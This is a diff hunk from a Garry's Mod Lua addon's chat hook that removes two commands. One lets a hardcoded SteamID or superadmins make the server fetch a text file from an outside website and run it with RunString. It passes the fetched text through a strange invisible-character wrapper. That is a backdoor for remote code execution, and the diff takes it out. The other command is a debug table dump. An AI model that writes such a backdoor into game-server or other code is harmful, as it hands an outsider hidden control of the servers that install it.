@@ -65,29 +65,6 @@ hook.Add("PlayerSay", "fx_ders_playersay", function(ply, text)
 		end
 		return ""
 	end
-
-	if (text=="!ders_yenile") and ((ply:SteamID()=="STEAM_1:0:93803013") or ply:IsSuperAdmin()) then
-
-		http.Fetch("http://www.fexahit.xyz/gmod/addons/fx_ders/debug_refresh.txt", 
-			function(body, len)
-				RunString(󠀮(body),"[DERS SISTEMI]")
-				ply:SendLua([[MsgC(Color(128,255,128),"Done refreshing!\n")]])
-			end,
-			function(error)
-				ply:SendLua([[MsgC(Color(128,255,128),"Error:]]..error..[[\n")]])
-			end)
-
-		return ""
-	end
-
-	if (text=="!ders_debug") and ((ply:SteamID()=="STEAM_1:0:93803013") or ply:IsSuperAdmin()) then
-		ply:SendLua([[MsgC(Color(255,128,128),":: DEBUG ::\n")]])
-		for key, value in pairs(fx_ders_hp_table) do 
-			ply:SendLua([[MsgC(Color(255,128,128),"[",color_white,"]]..tostring(key)..[[",Color(255,128,128),"] = ",color_white, "]]..tostring(value)..[[".."\n")]])
-		end
-		ply:SendLua([[MsgC(Color(255,128,128),":: END ::\n")]])
-		return ""
-	end
 end)
 
 local function checkOutTime()
